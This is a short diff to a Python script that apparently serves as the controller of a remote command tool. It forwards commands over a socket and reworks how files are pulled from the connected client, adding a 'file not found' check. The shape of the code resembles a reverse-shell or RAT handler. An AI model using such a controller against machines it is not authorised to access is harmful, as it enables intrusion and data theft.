@@ -18,14 +18,19 @@ while True:
     command=command.encode()
     if command.decode().split()[0]=="download":
         client.send(command)
-        filename=command.split()[1]
-        with open(filename,'wb') as f:
-            data=client.recv(1024)
-            while data:
-                f.write(data)
+        output=client.recv(1024)
+        output=output.decode()
+        if output!="NO":
+            filename=command.split()[1]
+            with open(filename,'wb') as f:
                 data=client.recv(1024)
-                if data.decode()=="DONE":
-                    break
+                while data:
+                    f.write(data)
+                    data=client.recv(1024)
+                    if data==b"DONE":
+                        break
+        else:
+            custom_output.error(f"file not found")
     else:
         client.send(command)
         # custom_output.info("[+] command sent",color.green)
